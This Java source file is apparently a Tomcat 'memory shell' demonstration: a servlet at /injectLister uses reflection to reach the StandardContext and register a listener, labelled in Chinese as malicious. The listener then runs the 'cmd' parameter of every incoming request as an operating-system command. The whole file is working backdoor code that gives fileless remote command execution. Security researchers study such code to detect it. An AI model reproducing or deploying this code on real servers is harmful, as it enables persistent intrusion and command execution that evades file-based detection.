package com;

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet("/injectLister")
public class InjectListener extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        class S implements ServletRequestListener{
            @Override
            public void requestInitialized(ServletRequestEvent sre) {
                System.out.println("恶意Listener启动");
                String cmd = sre.getServletRequest().getParameter("cmd");
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void requestDestroyed(ServletRequestEvent sre) {

            }
        }
        ServletContext servletContext = req.getServletContext();
        try {
            Field appctx = null;
            appctx = servletContext.getClass().getDeclaredField("context");

            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field stdctx = null;
            stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

                S evilListener = new S();
            standardContext.addApplicationEventListener(evilListener);

        }catch (Exception e){

        }
    }

}
